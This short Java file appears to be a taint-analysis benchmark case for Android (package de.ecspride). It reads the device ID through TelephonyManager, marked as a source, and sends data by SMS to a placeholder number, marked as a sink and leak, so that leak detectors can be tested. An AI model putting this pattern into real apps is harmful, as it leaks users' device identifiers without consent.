package de.ecspride;

import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class ConcreteClass extends BaseClass {

	@Override
	public String foo(Context context) {
		TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return telephonyManager.getDeviceId(); //source
	}
	
	@Override
	public void bar(String s) {
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, s, null, null);   //sink, leak
	}
	
}
